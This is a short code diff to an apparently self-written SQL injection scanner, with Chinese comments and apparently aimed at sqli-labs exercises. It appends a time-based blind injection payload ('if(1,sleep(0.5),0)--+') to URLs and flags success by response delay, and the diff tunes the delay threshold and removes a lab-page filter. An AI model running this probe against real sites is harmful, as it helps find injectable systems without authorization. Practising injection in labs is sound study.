@@ -85,14 +85,14 @@ class UrlInjector(HTTP):
         self.Print(f"{code=},{newlen=},{self.new_time}【{self._url % '1'}】")
         for url_end in Global_UserData['inj_type']:
             # 循环构造 注入点
-            url = self._url % url_end + ' and if(1,sleep(1),0)--+'
+            url = self._url % url_end + ' and if(1,sleep(0.5),0)--+'
 
             # 查询新时间
             newlen, code = self.GET(url)
             print(f'>>>{self._threadname}：{code=},{newlen=},{self.new_time}【{url}】')
 
             # 如果产生sleep，则表示注入成功
-            if (self.new_time - self.old_time) * 1000 > 900:
+            if (self.new_time - self.old_time) * 1000 > 400:
                 if '注入方式' not in self._inj_info:
                     self._inj_info['注入方式'] = {}
                 self._inj_info['注入方式']['基于时间盲注'] = self._url % url_end
@@ -106,8 +106,8 @@ class UrlInjector(HTTP):
         self._lock = Lock
         self._threadname = ThreadName
         self._url = Url
-        if 'Less-7' not in Url:
-            return
+        # if 'Less-5' not in Url:
+        #     return
 
         self.Print(f'扫描器传入 {Url=}')
         self.url = Url
